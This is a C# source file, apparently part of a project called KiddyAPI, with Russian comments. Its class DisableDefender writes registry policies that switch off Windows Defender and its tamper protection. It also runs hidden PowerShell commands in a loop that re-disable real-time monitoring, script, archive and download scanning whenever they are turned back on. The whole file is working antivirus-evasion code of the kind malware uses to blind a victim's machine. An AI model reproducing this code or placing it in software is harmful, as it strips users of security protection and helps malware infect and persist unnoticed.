using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace KiddyAPI.Protect
{
    /// <summary>
    /// Отключаем защитника Windows, через реестр
    /// </summary>
    public class DisableDefender
    {
        /// <summary>
        /// Отключаем
        /// </summary>
        /// <returns>Вернет true, если отключил(Нужны права администратора)</returns>
        public static bool FirstRun()
        {
            if (!Config.IsAdmin) return false;
            RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender", "DisableAntiSpyware", "1");
            RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableBehaviorMonitoring", "1");
            RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableOnAccessProtection", "1");
            RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableScanOnRealtimeEnable", "1");
            RegistryEdit(@"SOFTWARE\Microsoft\Windows Defender\Features", "TamperProtection", "0");
            return true;

        }

        private static void RegistryEdit(string regPath, string name, string value)
        {
            using (RegistryKey key = Registry.LocalMachine.OpenSubKey(regPath, RegistryKeyPermissionCheck.ReadWriteSubTree))
            {
                if (key == null)
                {
                    Registry.LocalMachine.CreateSubKey(regPath).SetValue(name, value, RegistryValueKind.DWord);
                    return;
                }
                if (key.GetValue(name) != (object)value)
                    key.SetValue(name, value, RegistryValueKind.DWord);
            }
        }
        /// <summary>
        /// Проверяем изменялись ли функции отключения, если да, включаем опять. Выполняется в бесконечном цикле
        /// </summary>
        public static void CheckDefender()
        {
            Process process = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "powershell",
                    Arguments = "Get-MpPreference -verbose",
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                }
            };
            process.Start();
            while (!process.StandardOutput.EndOfStream)
            {
                string outLine = process.StandardOutput.ReadLine();

                if (outLine.Contains(@"DisableRealtimeMonitoring") && outLine.Contains("False"))
                    Disable("Set-MpPreference -DisableRealtimeMonitoring $true"); //Защита в режиме реального времени

                else if (outLine.Contains(@"DisableBehaviorMonitoring") && outLine.Contains("False"))
                    Disable("Set-MpPreference -DisableBehaviorMonitoring $true"); //режим мониторинга

                else if (outLine.Contains(@"DisableBlockAtFirstSeen") && outLine.Contains("False"))
                    Disable("Set-MpPreference -DisableBlockAtFirstSeen $true");

                else if (outLine.Contains(@"DisableIOAVProtection") && outLine.Contains("False"))
                    Disable("Set-MpPreference -DisableIOAVProtection $true"); // Сканирование всех скачанных файлов

                else if (outLine.Contains(@"SignatureDisableUpdateOnStartupWithoutEngine") && outLine.Contains("False"))
                    Disable("Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true"); // Изменения в автозагрузке

                else if (outLine.Contains(@"DisableArchiveScanning") && outLine.Contains("False"))
                    Disable("Set-MpPreference -DisableArchiveScanning $true"); // Сканирование zip файлов

                else if (outLine.Contains(@"DisableIntrusionPreventionSystem") && outLine.Contains("False"))
                    Disable("Set-MpPreference -DisableIntrusionPreventionSystem $true"); // Интернет защита

                else if (outLine.Contains(@"DisableScriptScanning") && outLine.Contains("False"))
                    Disable("Set-MpPreference -DisableScriptScanning $true"); //сканирования скриптов, во время сканирования
            }
        }

        private static void Disable(string args)
        {
            Process proc = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "powershell",
                    Arguments = args,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                }
            };
            proc.Start();
        }
    }
}
